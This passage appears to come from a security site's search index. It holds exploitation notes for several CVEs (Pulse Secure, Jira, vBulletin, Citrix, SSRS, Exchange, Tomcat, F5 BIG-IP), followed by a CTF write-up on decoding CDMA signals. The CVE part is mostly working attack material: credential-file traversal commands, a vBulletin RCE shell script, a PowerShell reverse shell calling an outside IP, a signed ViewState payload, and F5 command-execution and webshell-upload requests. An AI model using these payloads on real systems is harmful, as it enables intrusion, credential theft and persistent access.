-a Link https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101","title":"CVE-2019-11510"},{"location":"cve/CVE-2019-11510/#pulse-secure-cve-2019-11510","text":"","title":"Pulse Secure (CVE-2019-11510)"},{"location":"cve/CVE-2019-11510/#description","text":"There is a Path Traversal vulnerability on Pulse Secure VPN endpoint: curl --path-as-is -k -D- 'https://<hostname>/dana-na/../dana/html5acc/guacamole/../../../../../../etc/hosts?/dana/html5acc/guacamole/#' You can grab the following files: /data/runtime/mtmp/system /data/runtime/mtmp/lmdb/dataa/data.mdb /data/runtime/mtmp/lmdb/dataa/lock.mdb /data/runtime/mtmp/lmdb/randomVal/data.mdb /data/runtime/mtmp/lmdb/randomVal/lock.mdb The VPN user and hashed passwords are stored in the mtmp/system file, but when users log into the application, it caches the plain-text password into dataa/data.mdb . grep 'password@9' data.mdb -a","title":"Description"},{"location":"cve/CVE-2019-11510/#link","text":"https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101","title":"Link"},{"location":"cve/CVE-2019-11581/","text":"RCE in Jira (CVE-2019\u201311581) The \"contact Admin\" functionality is accessible on this URL: https://jiraserver/secure/ContactAdministrators!default.jspa The Subject field is vulnerable to Template-Injection (freemarker): $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cmd').waitFor() For example, the command can be: curl http://<ip>:<port>/ to test if the server can make an HTTP request outside python -c '' to execute commands such as a reverse-shell","title":"CVE-2019-11581"},{"location":"cve/CVE-2019-11581/#rce-in-jira-cve-201911581","text":"The \"contact Admin\" functionality is accessible on this URL: https://jiraserver/secure/ContactAdministrators!default.jspa The Subject field is vulnerable to Template-Injection (freemarker): $i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('cmd').waitFor() For example, the command can be: curl http://<ip>:<port>/ to test if the server can make an HTTP request outside python -c '' to execute commands such as a reverse-shell","title":"RCE in Jira (CVE-2019\u201311581)"},{"location":"cve/CVE-2019-16759/","text":"VBulletin RCE (CVE-2019-16759) There is a vulnerability in VBulletin from version 5.0.0 to 5.5.4, allowing unauthenticated user to execute commands on the system (RCE) via widgetConfig[code] parameter in an ajax/render/widget_php routestring request. POC import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s <vBulletin URL>\" % sys.argv[0]) def do_cmd(url, cmd): params = { 'routestring': 'ajax/render/widget_php', 'widgetConfig[code]': 'echo shell_exec(\\'' + cmd + '\\'); exit;' } r = requests.post(url=url, data=params) if r.status_code == 200: return r.text else: raise Exception('Cannot exploit target') while True: try: cmd = raw_input(\"> \") output = do_cmd(cmd) print(output) except KeyboardInterrupt: sys.exit(\"Closing shell...\") except Exception, e: sys.exit(str(e))","title":"CVE-2019-16759"},{"location":"cve/CVE-2019-16759/#vbulletin-rce-cve-2019-16759","text":"There is a vulnerability in VBulletin from version 5.0.0 to 5.5.4, allowing unauthenticated user to execute commands on the system (RCE) via widgetConfig[code] parameter in an ajax/render/widget_php routestring request.","title":"VBulletin RCE (CVE-2019-16759)"},{"location":"cve/CVE-2019-16759/#poc","text":"import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s <vBulletin URL>\" % sys.argv[0]) def do_cmd(url, cmd): params = { 'routestring': 'ajax/render/widget_php', 'widgetConfig[code]': 'echo shell_exec(\\'' + cmd + '\\'); exit;' } r = requests.post(url=url, data=params) if r.status_code == 200: return r.text else: raise Exception('Cannot exploit target') while True: try: cmd = raw_input(\"> \") output = do_cmd(cmd) print(output) except KeyboardInterrupt: sys.exit(\"Closing shell...\") except Exception, e: sys.exit(str(e))","title":"POC"},{"location":"cve/CVE-2019-19781/","text":"Citrix Admin URL RCE (CVE-2019-19781) Check the vulnerability From the Citrix report , it's look like using a crafted URL you can bypass user permissions. The fix is the following: enable ns feature responder add responder action respondwith403 respondwith \"\\\"HTTP/1.1 403 Forbidden\\r\\n\\r\\n\\\"\" add responder policy ctx267027 \"HTTP.REQ.URL.DECODE_USING_TEXT_MODE.CONTAINS(\\\"/vpns/\\\") && (!CLIENT.SSLVPN.IS_SSLVPN || HTTP.REQ.URL.DECODE_USING_TEXT_MODE.CONTAINS(\\\"/../\\\"))\" respondwith403 bind responder global ctx267027 1 END -type REQ_OVERRIDE save config A legit URL is https://<host>/vpn/tmindex.html , then you should access the admin panel using the custom URL https://<host>/vpn/..%2fvpns/apps.html . You can test this vulnerability by downloading some executable files: /vpn/../vpns/services.html /vpn/../vpns/cfg/smb.conf You can check if a server is patched because it returns the following line as a HTTP response: HTTP/1.1 403 Forbidden Exploit A full exploit can be download here . It uses a Python reverse-shell, so you need a listener . To exploit the vulnerability you need to perform the following requests : Create a fake template file containing the payload based on the NSC_USER header Request the created file to execute the payload POST https://{host}:{port}/vpn/../vpns/portal/scripts/newbm.pl User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 NSC_USER: ../../../netscaler/portal/templates/<filename> NSC_NONCE: <nounce> url=127.0.0.1&title=<payload>&desc=desc&UI_inuse=a GET https://{host}:{port}/vpn/../vpns/portal/<filename>.xml User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 NSC_USER: <randomuser> NSC_NONCE: <nounce>","title":"CVE-2019-19781"},{"location":"cve/CVE-2019-19781/#citrix-admin-url-rce-cve-2019-19781","text":"","title":"Citrix Admin URL RCE (CVE-2019-19781)"},{"location":"cve/CVE-2019-19781/#check-the-vulnerability","text":"From the Citrix report , it's look like using a crafted URL you can bypass user permissions. The fix is the following: enable ns feature responder add responder action respondwith403 respondwith \"\\\"HTTP/1.1 403 Forbidden\\r\\n\\r\\n\\\"\" add responder policy ctx267027 \"HTTP.REQ.URL.DECODE_USING_TEXT_MODE.CONTAINS(\\\"/vpns/\\\") && (!CLIENT.SSLVPN.IS_SSLVPN || HTTP.REQ.URL.DECODE_USING_TEXT_MODE.CONTAINS(\\\"/../\\\"))\" respondwith403 bind responder global ctx267027 1 END -type REQ_OVERRIDE save config A legit URL is https://<host>/vpn/tmindex.html , then you should access the admin panel using the custom URL https://<host>/vpn/..%2fvpns/apps.html . You can test this vulnerability by downloading some executable files: /vpn/../vpns/services.html /vpn/../vpns/cfg/smb.conf You can check if a server is patched because it returns the following line as a HTTP response: HTTP/1.1 403 Forbidden","title":"Check the vulnerability"},{"location":"cve/CVE-2019-19781/#exploit","text":"A full exploit can be download here . It uses a Python reverse-shell, so you need a listener . To exploit the vulnerability you need to perform the following requests : Create a fake template file containing the payload based on the NSC_USER header Request the created file to execute the payload POST https://{host}:{port}/vpn/../vpns/portal/scripts/newbm.pl User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 NSC_USER: ../../../netscaler/portal/templates/<filename> NSC_NONCE: <nounce> url=127.0.0.1&title=<payload>&desc=desc&UI_inuse=a GET https://{host}:{port}/vpn/../vpns/portal/<filename>.xml User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0 NSC_USER: <randomuser> NSC_NONCE: <nounce>","title":"Exploit"},{"location":"cve/CVE-2020-0618/","text":"RCE in SQL Server Reporting Services (SSRS) From: https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/ In the following request, the parameter NavigationCorrector$ViewState is deserialized using the class LosFormatter : POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded Content-Length: X NavigationCorrector$PageState=NeedsCorrection&NavigationCorrector$ViewState=[PayloadHere]&__VIEWSTATE The payload can be a reverse-shell in Powershell . For instance, the one liner from ( @samratashok ). To exploit the LosFormatter deserializer, ysoserial is used. $command = '$client = New-Object System.Net.Sockets.TCPClient(\"192.168.6.135\",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) .\\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"powershell.exe -encodedCommand $encodedCommand\" -o base64 | clip","title":"CVE-2020-0618"},{"location":"cve/CVE-2020-0618/#rce-in-sql-server-reporting-services-ssrs","text":"From: https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/ In the following request, the parameter NavigationCorrector$ViewState is deserialized using the class LosFormatter : POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1 Host: target Content-Type: application/x-www-form-urlencoded Content-Length: X NavigationCorrector$PageState=NeedsCorrection&NavigationCorrector$ViewState=[PayloadHere]&__VIEWSTATE The payload can be a reverse-shell in Powershell . For instance, the one liner from ( @samratashok ). To exploit the LosFormatter deserializer, ysoserial is used. $command = '$client = New-Object System.Net.Sockets.TCPClient(\"192.168.6.135\",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 =$sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) .\\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c \"powershell.exe -encodedCommand $encodedCommand\" -o base64 | clip","title":"RCE in SQL Server Reporting Services (SSRS)"},{"location":"cve/CVE-2020-0688/","text":"RCE in Microsoft Exchange Web Interface (CVE-2020-0688) From Zero Day Initiative blog post. A IIS use a validationKey and decryptionKey in the web.config file to secure the ViewState . On an unpatched Microsoft Exchange Server, those keys are not generated on the installation. Therefore the validationKey has always the value CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF . An attacker can craft a malicious signed ViewState that is going to be accepted by the server. By nature, the ViewState is a serialized .Net object. So it's possible to execute commands on the context of the server ( SYSTEM ) from the Exchange Control Panel web application. To exploit the vulnerability we need a valid authenticated session to collect the ViewStateUserKey ( ASP.NET_SessionId cookie) and __VIEWSTATEGENERATOR value. It appears the __VIEWSTATEGENERATOR is often B97B4E27 . First, visit /ecp/default.aspx and collect the two values. Then use ysoserial to generate the payload: ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"<cmd>\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"<generator>\" --viewstateuserkey=\"<ASP.NET_SessionId>\" \u2013islegacy Finally visit the following URL: https://<host>/ecp/default.aspx?__VIEWSTATEGENERATOR=<generator>&__VIEWSTATE=<serialized_payload> # For example (don't forget to url-encode the payload): https://<host>/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2fwEyvgYAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADgBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+DQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgPg0KICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgIDxTeXN0ZW06U3RyaW5nPmNtZDwvU3lzdGVtOlN0cmluZz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc+L2MgIndob2FtaSIgPC9TeXN0ZW06U3RyaW5nPg0KICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPg0KICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KPC9SZXNvdXJjZURpY3Rpb25hcnk+C+WQX7ojOTAExs0xHxNenDx4VyQF","title":"CVE-2020-0688"},{"location":"cve/CVE-2020-0688/#rce-in-microsoft-exchange-web-interface-cve-2020-0688","text":"From Zero Day Initiative blog post. A IIS use a validationKey and decryptionKey in the web.config file to secure the ViewState . On an unpatched Microsoft Exchange Server, those keys are not generated on the installation. Therefore the validationKey has always the value CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF . An attacker can craft a malicious signed ViewState that is going to be accepted by the server. By nature, the ViewState is a serialized .Net object. So it's possible to execute commands on the context of the server ( SYSTEM ) from the Exchange Control Panel web application. To exploit the vulnerability we need a valid authenticated session to collect the ViewStateUserKey ( ASP.NET_SessionId cookie) and __VIEWSTATEGENERATOR value. It appears the __VIEWSTATEGENERATOR is often B97B4E27 . First, visit /ecp/default.aspx and collect the two values. Then use ysoserial to generate the payload: ysoserial.exe -p ViewState -g TextFormattingRunProperties -c \"<cmd>\" --validationalg=\"SHA1\" --validationkey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\" --generator=\"<generator>\" --viewstateuserkey=\"<ASP.NET_SessionId>\" \u2013islegacy Finally visit the following URL: https://<host>/ecp/default.aspx?__VIEWSTATEGENERATOR=<generator>&__VIEWSTATE=<serialized_payload> # For example (don't forget to url-encode the payload): https://<host>/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&__VIEWSTATE=%2fwEyvgYAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAADgBDxSZXNvdXJjZURpY3Rpb25hcnkNCiAgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiINCiAgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiDQogIHhtbG5zOlN5c3RlbT0iY2xyLW5hbWVzcGFjZTpTeXN0ZW07YXNzZW1ibHk9bXNjb3JsaWIiDQogIHhtbG5zOkRpYWc9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PXN5c3RlbSI+DQoJIDxPYmplY3REYXRhUHJvdmlkZXIgeDpLZXk9IkxhdW5jaENhbGMiIE9iamVjdFR5cGUgPSAieyB4OlR5cGUgRGlhZzpQcm9jZXNzfSIgTWV0aG9kTmFtZSA9ICJTdGFydCIgPg0KICAgICA8T2JqZWN0RGF0YVByb3ZpZGVyLk1ldGhvZFBhcmFtZXRlcnM+DQogICAgICAgIDxTeXN0ZW06U3RyaW5nPmNtZDwvU3lzdGVtOlN0cmluZz4NCiAgICAgICAgPFN5c3RlbTpTdHJpbmc+L2MgIndob2FtaSIgPC9TeXN0ZW06U3RyaW5nPg0KICAgICA8L09iamVjdERhdGFQcm92aWRlci5NZXRob2RQYXJhbWV0ZXJzPg0KICAgIDwvT2JqZWN0RGF0YVByb3ZpZGVyPg0KPC9SZXNvdXJjZURpY3Rpb25hcnk+C+WQX7ojOTAExs0xHxNenDx4VyQF","title":"RCE in Microsoft Exchange Web Interface (CVE-2020-0688)"},{"location":"cve/CVE-2020-1938/","text":"Ghostcat (CVE-2020-1938) On vulnerable Tomcat it's possible to download a file from a webapp using the AJP protocol. At the moment, it's not possible to read file from an other location ( /etc/passwd for instance) or execute code. The tool AJPy has the exploitation code: python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 127.0.0.1","title":"CVE-2020-1938"},{"location":"cve/CVE-2020-1938/#ghostcat-cve-2020-1938","text":"On vulnerable Tomcat it's possible to download a file from a webapp using the AJP protocol. At the moment, it's not possible to read file from an other location ( /etc/passwd for instance) or execute code. The tool AJPy has the exploitation code: python tomcat.py read_file --webapp=manager /WEB-INF/web.xml 127.0.0.1","title":"Ghostcat (CVE-2020-1938)"},{"location":"cve/CVE-2020-5902/","text":"RCE on F5 Big-IP (CVE-2020-5902) In BIG-IP versions 15.0.0-15.1.0.3 , 14.1.0-14.1.2.5 , 13.1.0-13.1.3.3 , 12.1.0-12.1.5.1 and 11.6.1-11.6.5.1 there is a vulnerability on the Traffic Management User Interface (TMUI) allowing a user to bypass the authentication to read arbitrary files and execute commands. Exploit List files https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/etc/ Read file https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd Upload file https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp fileName={FILE_DESTINATION_PATH}&content={FILE_CONTENT} https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={FILE_DESTINATION_PATH} {\"output\":\"{FILE_CONTENT}\\n\"} List users https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin Execute commands To execute commands, you need to create an alias then upload your command. You can use a reverse shell to gain an access to the box. The following requests from MSF execute the id command on the vulnerable endpoint: https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list You can also upload a webshell to have a persistent access: mount -o remount -rw /usr; echo '{BASE64_PAYLOAD}' | /usr/bin/openssl base64 -d -out /usr/local/www/xui/common/images/bg_status.php mount -o remount -rw /usr; echo '{PHP_PAYLAOD}' > /usr/local/www/xui/common/scripts/utility.php; mount -o remount -r /usr Technical details The vulnerability comes from how web servers parse URL. OrangeTsai explained during a talk at the Black Hat US-18 how it's possible to bypass some verification between two different web servers. On slide 51, he shows the example of Jira to access the secure dashboard with a Path Traversal technique ..; . This is the same technique here for the F5 TMUI. https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa","title":"CVE-2020-5902"},{"location":"cve/CVE-2020-5902/#rce-on-f5-big-ip-cve-2020-5902","text":"In BIG-IP versions 15.0.0-15.1.0.3 , 14.1.0-14.1.2.5 , 13.1.0-13.1.3.3 , 12.1.0-12.1.5.1 and 11.6.1-11.6.5.1 there is a vulnerability on the Traffic Management User Interface (TMUI) allowing a user to bypass the authentication to read arbitrary files and execute commands.","title":"RCE on F5 Big-IP (CVE-2020-5902)"},{"location":"cve/CVE-2020-5902/#exploit","text":"","title":"Exploit"},{"location":"cve/CVE-2020-5902/#list-files","text":"https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/etc/","title":"List files"},{"location":"cve/CVE-2020-5902/#read-file","text":"https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd","title":"Read file"},{"location":"cve/CVE-2020-5902/#upload-file","text":"https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp fileName={FILE_DESTINATION_PATH}&content={FILE_CONTENT} https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName={FILE_DESTINATION_PATH} {\"output\":\"{FILE_CONTENT}\\n\"}","title":"Upload file"},{"location":"cve/CVE-2020-5902/#list-users","text":"https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin","title":"List users"},{"location":"cve/CVE-2020-5902/#execute-commands","text":"To execute commands, you need to create an alias then upload your command. You can use a reverse shell to gain an access to the box. The following requests from MSF execute the id command on the vulnerable endpoint: https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd https://{IP}:{PORT}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list You can also upload a webshell to have a persistent access: mount -o remount -rw /usr; echo '{BASE64_PAYLOAD}' | /usr/bin/openssl base64 -d -out /usr/local/www/xui/common/images/bg_status.php mount -o remount -rw /usr; echo '{PHP_PAYLAOD}' > /usr/local/www/xui/common/scripts/utility.php; mount -o remount -r /usr","title":"Execute commands"},{"location":"cve/CVE-2020-5902/#technical-details","text":"The vulnerability comes from how web servers parse URL. OrangeTsai explained during a talk at the Black Hat US-18 how it's possible to bypass some verification between two different web servers. On slide 51, he shows the example of Jira to access the secure dashboard with a Path Traversal technique ..; . This is the same technique here for the F5 TMUI. https://jira.uberinternal.com/status/..;/secure/Dashboard.jspa","title":"Technical details"},{"location":"cve/ffmpeg/","text":"FFmpeg HLS vulnerability There is a SSRF vulnerability on FFmpeg using a malicious HLS playlist inside an AVI video. More information here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS","title":"FFmpeg HLS vulnerability"},{"location":"cve/ffmpeg/#ffmpeg-hls-vulnerability","text":"There is a SSRF vulnerability on FFmpeg using a malicious HLS playlist inside an AVI video. More information here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS","title":"FFmpeg HLS vulnerability"},{"location":"cve/CVE-2019-1388/","text":"Windows Privilege Escalation Through UAC (CVE-2019-1388) ZeroDay initiative explains on a YouTube video how to exploit pass System on a Windows 7 machine (CVE-2019-1388). First you need an executable that is signed with a custom certificate. They use httpud.exe that you can download here or you can decode the one provided here . > certutil -decode httpud.asc httpud.exe","title":"CVE-2019-1388"},{"location":"cve/CVE-2019-1388/#windows-privilege-escalation-through-uac-cve-2019-1388","text":"ZeroDay initiative explains on a YouTube video how to exploit pass System on a Windows 7 machine (CVE-2019-1388). First you need an executable that is signed with a custom certificate. They use httpud.exe that you can download here or you can decode the one provided here . > certutil -decode httpud.asc httpud.exe","title":"Windows Privilege Escalation Through UAC (CVE-2019-1388)"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/","text":"WRITE UP - INS'HACK 2019: CHALLS DONT MATTER ANYMORE This is a write-up for the challs dont matter anymore challenge of INS\u2019hAck 2019 by LarsH on behalf of team HackingForSoju. Description You\u2019ve definitely pissed off these aliens by breaking their secret transmission methods ! Now they have 8 devices transmitting on the same frequency, using 32-bit synchronous CDMA. One of the devices is sending unencrypted codes, this is our chance ! The intercepted transmission is in this file. Attached is the file CDMA_interception.wav. Analysis So we are given the information that the data is sent using CDMA. Several signals can be transmitted with CDMA using orthogonal codes, wikipedia page. If we look at how the input data looks in Audacity, we can see that the signal seems to be partwise constant in blocks of 100 samples with some noise added. We can compute the mean value for every time slot and plot. wav = wavio.read('CDMA_interception.wav') means = wav.data.reshape((wav.data.size/100,100)).mean(axis=1) plt.hist(means,bins=1000) plt.plot(sorted(means),range(len(means))) The mean values for the time slots separate into several distinct groups, depending of what the transmitters send. This is the interference pattern. The first side groups are located at +/-7500, so we can compute the number of the bin by dividing by 7500 and rounding to the nearest integer. We were given that the transmission uses 32-bit codes, so we can reshape the data into a matrix with 32 columns and find an orthogonal base in that data set. There are several ways, but LLL-lattice reduction worked fine. matrix = (means.reshape((means.size/32,32))/7500.0).round().astype(int) base = reduceLattice(matrix) This gave 8 base vectors that span the data set. (It was at this stage the smell of flag started to show, as we were given the information that there were 8 devices.) The base was: [ 1, 1, 1, 1,-1,-1, 1, 1,-1,-1, 1,-1, 1,-1,-1,-1, 1,-1,-1,-1,-1,-1, 1,-1, 1, 1, 1, 1,-1,-1, 1, 1] [-1,-1, 1, 1, 1,-1,-1, 1,-1, 1, 1,-1,-1,-1, 1,-1, 1, 1, 1, 1,-1, 1, 1,-1, 1,-1,-1,-1, 1, 1, 1, 1] [ 1,-1, 1, 1, 1,-1,-1,-1,-1,-1,-1,-1,-1,-1, 1, 1,-1, 1,-1,-1,-1,-1,-1, 1,-1,-1, 1, 1, 1,-1,-1, 1] [-1, 1, 1, 1,-1,-1,-1,-1, 1,-1, 1, 1, 1,-1,-1,-1,-1, 1, 1, 1, 1,-1,-1, 1,-1, 1,-1, 1, 1, 1, 1, 1] [ 0, 1,-1,-1,-1,-2, 1, 2, 0, 2, 0,-2, 0, 0, 0,-1, 3,-1, 2,-1,-1,-1, 3,-3, 0,-2, 0,-1,-1, 0, 1, 0] [-1, 0, 0, 0,-2, 1, 2,-1, 1,-1, 3, 1, 3,-1,-1, 0, 0,-2,-1, 2, 2, 0, 0, 0, 1, 3, 1, 2, 0,-1, 0, 1] [-1, 1,-1, 1,-1,-1,-1, 1, 1, 1,-1,-1, 1, 1, 1,-1, 1, 1, 1,-1,-1,-1,-1, 1,-1,-1, 1,-1,-1,-1, 1,-1] [ 1, 0, 2, 0, 2, 1, 2, 1,-1, 1, 1,-1,-1, 1,-1,-2, 0,-2,-1, 0,-2, 2, 2,-2, 3, 1,-1, 0, 0, 1, 2,-1] We can see that this base is not perfect, as all base vectors should have been 1 or -1. This is because LLL minimizes vectors with the L2-norm, not the L-inf-norm. But the base was good enough to use, if we just reduce the rawdata after decoding with this base. To decode the data, we take the dot product with the base and reduce again: rawdata = base.dot(matrix.transpose()) data = reduceLattice(rawdata) Source code This script solves the challenge: import wavio, fpylll, bitarray, numpy def reduceLattice(lattice): A = fpylll.IntegerMatrix.from_matrix(lattice) M = fpylll.GSO.Mat(A) M.update_gso() L = fpylll.LLL.Reduction(M) L() return numpy.array(map(list, A), dtype=int) wav = wavio.read('CDMA_interception.wav') # Compute mean values for every time slot means = wav.data.reshape((wav.data.size/100,100)).mean(axis=1) # Convert mean values to integers and reshape into matrix of data matrix = (means.reshape((means.size/32,32))/7500.0).round().astype(int) # Get reduced basis for matrix through lattice reduction base = reduceLattice(matrix)[:8] # Compute raw data through dot product with basis rawdata = base.dot(matrix.transpose()) # Reduce raw data more, as base is not perfect data = reduceLattice(rawdata) # To through all 8 data streams and print flag if found for d in data: plaintext = bitarray.bitarray(list(d<0),endian='big').tobytes() if 'INSA' in plaintext: print plaintext Running it gives the flag: $ python solve.py Oh hi, I see you've found my secret device. Want a flag ? Here you go INSA{Elektr0nenklange_Aus_d3m_R4di0l4nD}","title":"Challs Dont Matter Anymore"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/#write-up-inshack-2019-challs-dont-matter-anymore","text":"This is a write-up for the challs dont matter anymore challenge of INS\u2019hAck 2019 by LarsH on behalf of team HackingForSoju.","title":"WRITE UP - INS'HACK 2019: CHALLS DONT MATTER ANYMORE"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/#description","text":"You\u2019ve definitely pissed off these aliens by breaking their secret transmission methods ! Now they have 8 devices transmitting on the same frequency, using 32-bit synchronous CDMA. One of the devices is sending unencrypted codes, this is our chance ! The intercepted transmission is in this file. Attached is the file CDMA_interception.wav.","title":"Description"},{"location":"sdr/challs-dont-matter-anymore/hackingforsoju/#analysis","text":"So we are given the information that the data is sent using CDMA. Several signals can be transmitted with CDMA using orthogonal codes, wikipedia page. If we look at how the input data looks in Audacity, we can see that the signal seems to be partwise constant in blocks of 100 samples with some noise added. We can compute the mean value for every time slot and plot. wav = wavio.read('CDMA_interception.wav') means = wav.data.reshape((wav.data.size/100,100)).mean(axis=1) plt.hist(means,bins=1000) 